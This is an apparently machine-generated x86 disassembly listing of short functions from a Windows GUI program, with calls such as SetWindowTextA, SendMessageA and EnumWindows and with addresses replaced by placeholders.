sub_43c134
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_4393d8
mov eax [ eax + 0x14 ]
pop esi
pop ebx
retn
sub_43c198
mov ecx [ eax ]
call [ ecx + 0x54 ]
retn
sub_43c1a0
push ebx
mov ebx ecx
mov eax [ eax + 0x14 ]
call sub_43b124
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
pop ebx
retn
sub_43c1e8
push esi
mov esi ecx
mov eax [ eax + 0x14 ]
call sub_43b124
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x24 ]
pop esi
retn
sub_43c23c
mov eax [ r-xdata ]
retn
sub_43c244
mov eax [ r-xdata ]
retn
sub_43c2ac
jmp sub_4038bc
sub_43c2b3
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_43c370
mov eax [ eax + 0xc ]
call sub_419538
retn
sub_43c466
jmp sub_4038bc
sub_43c46d
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_43c478
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax + 0x10 ] edx
xor eax eax
pop ebp
retn 0x4
sub_43c527
jmp sub_4038bc
sub_43c52e
pop ebp
retn
sub_43c530
sub [ rw-data ] 0x1
retn
sub_43c59f
jmp [ edi ]
sub_43c840
cmp [ eax + 0x5 ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x6 ] 0x0
je r-xdata
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_43c858
push ebx
cmp [ eax + 0x6a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x6c ]
call [ ebx + 0x68 ]
sub_43c89c
push ebx
mov ebx eax
mov eax ebx
call sub_43d0f8
mov eax ebx
mov edx [ eax ]
call [ edx ]
pop ebx
retn
sub_43d0e7
jmp sub_4038bc
sub_43d0f8
push ebx
mov ebx eax
cmp [ ebx + 0x6 ] 0x0
je r-xdata
call sub_42e664
mov [ ebx + 0x6 ] al
pop ebx
retn
mov eax ebx
call sub_43c86c
sub_43d14f
jmp sub_4038bc
sub_43d156
pop ebp
retn
sub_43d158
sub [ rw-data ] 0x1
retn
sub_43f950
mov dl 0x1
test eax eax
je r-xdata
xor edx edx
cmp [ eax + 0x7c ] 0x0
jne r-xdata
mov eax edx
retn
mov eax [ eax + 0x30 ]
test eax eax
jne r-xdata
sub_43fa17
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add [ ebx - 0x75 ] dl
fimul [ ebx - 0x33c5172d ]
add [ eax ] al
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_43fdd2
jmp sub_4038bc
sub_43fdd9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43fe5e
jmp sub_4038bc
sub_43fe65
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43fe6c
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
call sub_44c098
pop ebx
retn
sub_43fe80
push ebx
mov ebx eax
mov eax ebx
call sub_44edf0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
call sub_44c098
pop ebx
retn
sub_43fe9c
push ebx
mov ebx eax
mov eax ebx
call sub_44ddc4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_43ff48
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_448fac
pop esi
pop ebx
retn
sub_4400b2
jmp sub_4038bc
sub_4400b9
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4401c8
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_44b0a0
mov eax ebx
mov si 0xffc7
call sub_403324
pop esi
pop ebx
retn
sub_4402b4
push esi
mov esi eax
cmp dl [ esi + 0x16c ]
je r-xdata
pop esi
retn
mov [ esi + 0x16c ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4402d0
push esi
cmp dl [ eax + 0x16d ]
je r-xdata
pop esi
retn
mov [ eax + 0x16d ] dl
mov si 0xffc7
call sub_403324
sub_4402ec
test [ eax + 0x50 ] 0x40
setne al
xor al 0x1
retn
sub_4402f8
mov [ eax + 0x168 ] edx
test edx edx
je r-xdata
retn
xchg edx eax
call sub_420e08
sub_44030c
push esi
mov esi eax
cmp dl [ esi + 0x170 ]
je r-xdata
pop esi
retn
mov [ esi + 0x170 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_44036c
push esi
mov esi eax
cmp dl [ esi + 0x16e ]
je r-xdata
pop esi
retn
mov [ esi + 0x16e ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4403e0
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov si 0xffc7
call sub_403324
pop esi
pop ebx
retn
sub_4403fc
push esi
mov esi eax
mov eax esi
call sub_44abac
mov eax esi
mov si 0xffc7
call sub_403324
pop esi
retn
sub_4404a1
jmp sub_4038bc
sub_4404a8
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4404b0
push ebx
mov ebx eax
mov eax ebx
call sub_44ad10
cmp [ ebx + 0x182 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x184 ]
call [ ebx + 0x180 ]
sub_4404d4
push ebx
mov ebx eax
mov eax ebx
call sub_44ad28
cmp [ ebx + 0x17a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x17c ]
call [ ebx + 0x178 ]
sub_4405c0
cmp dl [ eax + 0x20f ]
je r-xdata
retn
mov [ eax + 0x20f ] dl
call sub_440bcc
sub_4405d4
push ebx
mov ebx eax
cmp dl [ ebx + 0x20c ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x20c ] dl
mov eax ebx
call sub_440bcc
mov eax ebx
call sub_44cd78
sub_4405f8
cmp dl [ eax + 0x213 ]
je r-xdata
retn
mov [ eax + 0x213 ] dl
call sub_44cd78
sub_44060c
cmp dl [ eax + 0x211 ]
je r-xdata
retn
mov [ eax + 0x211 ] dl
call sub_44cd78
sub_440650
cmp dl [ eax + 0x212 ]
je r-xdata
retn
mov [ eax + 0x212 ] dl
call sub_44cd78
sub_440751
jmp sub_4038bc
sub_440758
pop ebx
pop ecx
pop ebp
retn
sub_440870
push ebx
mov ebx eax
push r-xdata
mov eax ebx
call sub_44f7d8
push eax
call SetWindowTextA
pop ebx
retn
sub_44088c
push ebx
mov ebx eax
push 0xffffffff
push 0x0
push 0xb1
mov eax ebx
call sub_44f7d8
push eax
call SendMessageA
pop ebx
retn
sub_440932
jmp sub_4038bc
sub_440939
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4409d2
jmp sub_4038bc
sub_440b4b
jmp sub_4038bc
sub_440bb0
push ebx
mov ebx eax
mov eax ebx
call sub_440664
mov [ ebx + 0x215 ] al
mov eax ebx
call sub_44cb74
pop ebx
retn
sub_440cb0
push ebx
mov ebx eax
mov eax ebx
call sub_448bb8
cmp [ ebx + 0x21a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x21c ]
call [ ebx + 0x218 ]
sub_440da8
push esi
cmp [ edx + 0x6 ] 0x300
jne r-xdata
pop esi
retn
cmp [ eax + 0x214 ] 0x0
jne r-xdata
mov si 0xffb3
call sub_403324
sub_440e58
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x146
mov eax [ ebx + 0x10 ]
call sub_44f7d8
push eax
call SendMessageA
pop ebx
retn
sub_440eda
jmp sub_4038bc
sub_440ee1
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_440fcc
jmp sub_4038bc
sub_440fd3
pop ebx
pop ecx
pop ebp
retn
sub_4411a4
push ebx
mov ebx eax
mov edx r-xdata
mov eax ebx
call sub_448f88
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov [ ebx + 0x260 ] 0xffffffff
pop ebx
retn
sub_4411f4
push ebx
mov ebx eax
push 0xffff0000
push 0x0
push 0x142
mov eax ebx
call sub_44f7d8
push eax
call SendMessageA
pop ebx
retn
sub_4412e8
test edx edx
jle r-xdata
retn
mov [ eax + 0x238 ] edx
call sub_44cd78
sub_44131c
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_441324
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_44132c
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_441358
cmp eax [ edx + 0x8 ]
je r-xdata
retn
push 0x0
xor ecx ecx
mov edx 0x14f
call sub_44a198
sub_441488
push ebx
push esi
mov esi eax
mov eax [ esi + 0x258 ]
push eax
mov ecx [ esi + 0x244 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xf4 ]
pop esi
pop ebx
retn
sub_44175f
jmp sub_403608
sub_4419f0
jmp sub_4038bc
sub_4419f7
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_441a00
push ebx
mov ebx eax
mov eax ebx
call sub_448bb8
cmp [ ebx + 0x21a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x21c ]
call [ ebx + 0x218 ]
sub_441a24
push ebx
cmp [ eax + 0x22a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x22c ]
call [ ebx + 0x228 ]
sub_441aa0
push ebx
cmp [ eax + 0x232 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x234 ]
call [ ebx + 0x230 ]
sub_441bba
jmp sub_4038bc
sub_441c04
or edx 0xffffffff
mov ecx [ eax ]
call [ ecx + 0xd0 ]
retn
sub_441c8f
jmp sub_4038bc
sub_441c96
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_441cc8
mov edx [ eax ]
call [ edx + 0x104 ]
retn
sub_441cd4
mov [ eax + 0x210 ] edx
retn
sub_441d25
jmp sub_4038bc
sub_441d2c
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_441de6
jmp sub_4038bc
sub_441e90
mov eax [ r-xdata ]
retn
sub_441e98
xor eax eax
retn
sub_441ebc
retn
sub_441fd4
cmp dl [ eax + 0x209 ]
je r-xdata
retn
mov [ eax + 0x209 ] dl
call sub_44cd78
sub_44204c
push ebx
mov ebx eax
mov eax ebx
call sub_4607d8
test eax eax
je r-xdata
mov eax ebx
call sub_44a520
pop ebx
retn
mov edx [ ebx + 0x214 ]
mov [ eax + 0x24c ] edx
sub_442070
xor eax eax
retn
sub_442137
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x59b1173d ]
add [ eax ] al
mov al [ ebx + 0x210 ]
mov [ ebx + 0x212 ] al
pop ebx
retn
sub_442150
push esi
cmp [ edx + 0x6 ] 0x0
jne r-xdata
pop esi
retn
mov si 0xffeb
call sub_403324
sub_442241
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
sub_44224a
jmp sub_4038bc
j_sub_442241
jmp sub_442241
sub_442251
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_442384
mov al [ eax + 0x211 ]
retn
sub_4423b8
cmp dl [ eax + 0x210 ]
je r-xdata
retn
mov [ eax + 0x210 ] dl
call sub_44cd78
sub_442598
call sub_44cd78
retn
sub_442615
jmp sub_4038bc
sub_44261c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_442679
jmp sub_4038bc
sub_442680
pop ebp
retn
sub_442684
sub [ rw-data ] 0x1
retn
sub_442898
push ebx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_4032d8
pop ebx
retn
sub_4429cd
jmp sub_4038bc
sub_4429d4
pop ebp
retn
sub_4429d8
sub [ rw-data ] 0x1
retn
sub_4429e0
salc
dec eax
add cl ch
inc [ eax ]
add ah cl
add eax 0xffffffe0
jmp sub_443258
sub_4429f1
add eax 0xffffffe0
jmp sub_442fd8
sub_4429f9
add eax 0xffffffe0
jmp sub_443040
sub_442a01
add eax 0xffffffe0
jmp sub_443154
sub_442a09
add eax 0xffffffe0
jmp sub_4431c8
sub_442a11
add eax 0xffffffe0
jmp sub_442c84
sub_442a19
add eax 0xffffffe0
jmp sub_442c98
sub_442a21
add eax 0xffffffe0
jmp sub_442d10
sub_442a29
add eax 0xffffffe0
jmp sub_442db4
sub_442a31
add eax 0xffffffe0
jmp sub_442db8
sub_442a39
add eax 0xffffffe0
jmp sub_442e40
sub_442a41
add eax 0xffffffe0
jmp sub_442f88
sub_442a49
add eax 0xffffffe0
jmp sub_442f8c
sub_442a51
add eax 0xffffffe0
jmp sub_442fa8
sub_442a63
add [ esp + 0x4 ] 0xffffffe0
jmp sub_405888
sub_442a6d
add [ esp + 0x4 ] 0xffffffe0
jmp sub_40589c
sub_442c41
jmp sub_4038bc
sub_442c48
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_442c84
push ebx
mov ebx edx
mov eax ebx
mov edx [ rw-data ]
call sub_403f0c
pop ebx
retn
sub_442cff
jmp sub_4038bc
sub_442d06
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_442d98
jmp sub_4038bc
sub_442d9f
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_442db4
mov al 0x1
retn
sub_442e33
jmp sub_4038bc
sub_442e3a
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_442f38
jmp sub_4038bc
sub_442f3f
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_442f88
mov [ eax + 0xc ] edx
retn
sub_442f8c
mov [ eax + 0x10 ] 0x3
push 0x0
push 0x2
push r-xdata
push 0x0
call WinHelpA
retn
sub_443030
jmp sub_4038bc
sub_443037
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_443136
jmp sub_4038bc
sub_44313d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4431b6
jmp sub_4038bc
sub_4431bd
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_443248
jmp sub_4038bc
sub_44324f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_443343
jmp sub_4038bc
sub_44334a
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_44340c
mov [ eax + 0xc ] 0x0
mov [ eax + 0xd ] 0x0
xor edx edx
mov [ eax + 0x4 ] edx
push eax
push sub_443358
call EnumWindows
retn
sub_44349e
jmp sub_4038bc
sub_4434a5
mov al [ ebp - 0x5 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4434b0
xor eax eax
retn
sub_4435a9
jmp sub_4038bc
sub_4435b0
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44369a
jmp sub_4038bc
sub_4436a1
pop ebp
retn
sub_4436f6
jmp sub_4038bc
sub_4436fd
pop ebp
retn
sub_444900
jmp r-xdata
sub_444902
0xe8ffe9ff 0xe7ff
sub_444909
jmp esi
sub_44510c
inc esp
add [ edx + ebp * 8 ] ch
inc esp
add [ eax + 0x60004505 ] al
0xea7c0044 0x44
sub_44511e
adc [ esi ] al
inc ebp
add al bh
0xeb1c0044 0x44
sub_4459e6
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0xc ]
xchg [ esp ] eax
retn
sub_4459f3
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x28 ]
xchg [ esp ] eax
retn
sub_445a00
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x14 ]
xchg [ esp ] eax
retn
sub_445a0d
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
xchg [ esp ] eax
retn
sub_445a1a
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x20 ]
xchg [ esp ] eax
retn
sub_445a27
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x1c ]
xchg [ esp ] eax
retn
sub_445a34
add eax 0xffffff8c
jmp sub_4535a4
sub_445a46
add [ esp + 0x4 ] 0xffffff8c
jmp sub_405888
sub_445a50
add [ esp + 0x4 ] 0xffffff8c
jmp sub_40589c
sub_445d0c
mov dl [ eax ]
sub dl 0x1
jb r-xdata
mov [ eax ] 0x1
retn
je r-xdata
mov [ eax ] 0x0
jmp r-xdata
retn
sub_44601f
inc [ esi ]
add [ eax ] al
add [ ebx + 0x72 ] ah
push ebx
imul edi [ edx + 0x65 ] 0x156a0000
mov ecx rw-data
call sub_418024
retn
sub_44603c
push 0x15
mov ecx rw-data
call sub_417fe4
retn
sub_446128
call GetCapture
call sub_445e0c
test eax eax
je r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax [ rw-data ]
sub_44638c
push ebx
push eax
push sub_446510
call sub_421e98
mov ebx eax
push ebx
call SetCapture
mov eax ebx
pop ebx
retn
sub_4463a4
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_4463d4
push ebx
mov ebx edx
call ReleaseCapture
mov eax ebx
call sub_421f4c
pop ebx
retn
sub_4464b2
jmp sub_403608
sub_4464e4
xor eax eax
retn
sub_4464e8
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov ax 0xfff4
jmp r-xdata
pop ebp
retn 0x4
sub_446500
retn
sub_446504
mov eax [ rw-data ]
retn
sub_44650c
retn
sub_44653a
jmp sub_403608
sub_44653f
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_469620
call sub_403970
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44655c
call sub_403380
xor eax eax
mov [ rw-data ] eax
retn
sub_44656c
call sub_40337c
xor eax eax
mov [ rw-data ] eax
retn
sub_44657c
retn
sub_446580
test dl dl
je r-xdata
mov [ eax + 0x38 ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_40348c
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_446630
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov eax [ eax + 0x38 ]
mov ax [ eax + 0x7a ]
jmp r-xdata
pop ebp
retn 0x4
sub_446648
mov eax [ eax + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
retn
sub_446694
retn
sub_44684c
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffdb
call sub_403324
pop esi
retn
sub_446860
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffda
call sub_403324
pop esi
retn
sub_446874
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_446880
mov eax 0x4
retn
sub_446888
retn
sub_447479
jmp sub_403608
sub_447766
jmp sub_4038bc
sub_4477d8
jmp sub_4038bc
sub_4477e4
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
xor eax eax
call sub_44750c
sub_447963
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_425154
retn
sub_447979
jmp sub_4038bc
sub_4479a0
jmp sub_4038bc
sub_447a22
jmp sub_4038bc
sub_447a4a
jmp sub_4038bc
sub_447a51
mov esp ebp
pop ebp
retn
sub_447b09
jmp sub_4038bc
sub_447b60
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x58 ]
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_447b2c
mov [ ebx + 0x58 ] esi
sub_447cb4
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_447cc8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4032d8
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_447db1
jmp sub_4038bc
sub_447db8
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_447e3b
jmp sub_4038bc
sub_447e42
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_448210
xor eax eax
retn
sub_448214
mov al [ eax + 0x58 ]
retn
sub_448218
xor eax eax
retn
sub_44821c
cmp [ eax + 0x30 ] 0x0
setne al
retn
sub_448224
mov eax [ eax + 0x30 ]
retn
sub_4482c8
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x10 ]
retn
sub_448374
push ebx
mov ebx eax
xor eax eax
mov al [ ebx + 0x5b ]
mov al [ eax + rw-data ]
cmp al [ ebx + 0x61 ]
setne al
pop ebx
retn
sub_44838c
mov [ eax + 0x5d ] dl
retn
sub_448390
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
xchg edx eax
call sub_44bfdc
sub_4483a0
push ebx
cmp [ eax + 0xfa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
sub_448883
jmp sub_4038bc
sub_44888a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4488ec
test [ eax + 0x1c ] 0x1
jne r-xdata
mov [ eax + 0x158 ] edx
retn
mov [ eax + 0x150 ] 0x1
sub_448998
xor ecx ecx
mov [ edx ] ecx
xor ecx ecx
mov [ edx + 0x4 ] ecx
mov ecx [ eax + 0x48 ]
mov [ edx + 0x8 ] ecx
mov eax [ eax + 0x4c ]
mov [ edx + 0xc ] eax
retn
sub_448ab5
jmp sub_4038bc
sub_448abc
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_448bb8
push eax
xor ecx ecx
mov edx 0xb037
call sub_44a198
retn
sub_448d79
add [ eax ] al
add [ esi + 0x3a ] dl
push eax
pop esp
je r-xdata
pop esi
retn
mov [ eax + 0x5c ] dl
test dl dl
je r-xdata
mov si 0xffee
call sub_403324
sub_448e2a
jmp sub_4038bc
sub_448e31
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_448f08
cmp dl [ eax + 0x58 ]
je r-xdata
retn
mov [ eax + 0x58 ] dl
push 0x0
xor ecx ecx
mov edx 0xb00c
call sub_44a198
sub_448f20
push 0x0
xor ecx ecx
mov edx 0xe
call sub_44a198
retn
sub_448f30
push edx
mov edx 0xd
call sub_44a198
retn
sub_448f3c
mov edx [ eax + 0xac ]
test edx edx
jle r-xdata
mov eax [ eax + 0x4c ]
retn
mov eax edx
retn
sub_448f50
mov edx [ eax + 0xa8 ]
test edx edx
jle r-xdata
mov eax [ eax + 0x48 ]
retn
mov eax edx
retn
sub_449031
jmp sub_4038bc
sub_449038
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_449040
cmp dl [ eax + 0x5f ]
je r-xdata
retn
mov [ eax + 0x5f ] dl
mov [ eax + 0x60 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb03c
call sub_44a198
sub_4490b0
cmp [ eax + 0x59 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x56 ] 0x0
je r-xdata
mov al 0x1
retn
sub_4490c4
mov al [ eax + 0x9a ]
xor al 0x1
retn
sub_4490d0
mov al [ eax + 0x60 ]
xor al 0x1
retn
sub_4490d8
cmp dl [ eax + 0x59 ]
je r-xdata
retn
mov [ eax + 0x59 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb008
call sub_44a198
sub_4490fc
cmp dl [ eax + 0x99 ]
je r-xdata
retn
mov [ eax + 0x99 ] dl
mov [ eax + 0x9a ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb022
call sub_44a198
sub_449120
cmp dl [ eax + 0x9a ]
je r-xdata
retn
mov [ eax + 0x9a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb023
call sub_44a198
sub_449168
mov al [ eax + 0x5a ]
xor al 0x1
retn
sub_449194
cmp dl [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
call sub_44a198
sub_4491b8
cmp dx [ eax + 0x78 ]
je r-xdata
retn
mov [ eax + 0x78 ] dx
push 0x0
xor ecx ecx
mov edx 0xb00f
call sub_44a198
sub_4491d4
push ebx
mov ebx eax
call sub_446128
cmp ebx eax
sete al
pop ebx
retn
sub_44920c
push esi
mov dl 0x1
mov si 0xffce
call sub_403324
pop esi
retn
sub_449356
jmp sub_4038bc
sub_44935d
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_449480
test [ eax + 0x50 ] 0x40
setne cl
mov dl [ eax + 0x57 ]
call sub_4493f4
retn
sub_4494d4
xor edx edx
call sub_448ecc
retn
sub_44950c
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x88 ]
sub_449520
mov edx [ eax ]
call [ edx + 0x80 ]
retn
sub_449605
jmp sub_4038bc
sub_449624
xor eax eax
retn
sub_449628
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x0
jne r-xdata
mov al 0x1
retn
sub_449640
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x1
je r-xdata
mov al 0x1
retn
sub_449658
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
mov al [ eax + 0x5f ]
dec eax
sub al 0x2
jb r-xdata
mov al 0x1
retn
sub_449674
mov edx [ rw-data ]
mov ecx [ edx + 0x8 ]
mov edx [ rw-data ]
mov dl [ edx + 0x4 ]
call sub_44968c
retn
sub_449750
retn
sub_449754
cmp eax [ rw-data ]
sete al
retn
sub_4497c8
push ebx
cmp [ eax + 0x112 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
sub_4498e4
push ebp
mov ebp esp
push esi
mov si 0xffd2
call sub_403324
pop esi
pop ebp
retn 0x4
sub_449924
push ebx
cmp [ eax + 0x102 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
sub_449bbb
jmp sub_4038bc
sub_449bc2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_449bcc
push esi
mov esi eax
xor ecx ecx
mov eax esi
mov si 0xffe8
call sub_403324
pop esi
retn
sub_449be0
push esi
mov esi eax
mov cl 0x1
mov eax esi
mov si 0xffe8
call sub_403324
pop esi
retn
sub_449eaf
jmp sub_4038bc
sub_449f58
push esi
mov si 0xffee
call sub_403324
pop esi
retn
sub_449f64
mov al 0x1
retn
sub_44a23c
mov ecx [ edx ]
mov [ eax + 0x40 ] ecx
mov ecx [ edx + 0x4 ]
mov [ eax + 0x44 ] ecx
mov ecx [ edx + 0x8 ]
sub ecx [ edx ]
mov [ eax + 0x48 ] ecx
mov ecx [ edx + 0xc ]
sub ecx [ edx + 0x4 ]
mov [ eax + 0x4c ] ecx
call sub_4485d8
retn
sub_44a260
retn
sub_44a479
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_41c4c8
mov [ ebx + 0x5e ] al
pop esi
pop ebx
retn
sub_44a494
mov al [ eax + 0x5e ]
xchg edx eax
call sub_41e980
retn
sub_44a58c
push ebx
cmp [ eax + 0x12a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
sub_44aba4
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_44abac
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_44abb4
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_44ac6c
push esi
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
retn
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_44ac8c
push ebx
mov ebx eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x99 ]
mov eax ebx
call sub_4490fc
mov [ ebx + 0x9a ] 0x1
sub_44ace4
push ebx
mov ebx eax
cmp [ ebx + 0x56 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x84 ]
mov eax ebx
call sub_4490a0
mov [ ebx + 0x56 ] 0x1
sub_44ad08
mov [ edx + 0xc ] 0x1
retn
sub_44ad10
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb013
call sub_44a198
sub_44ad28
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
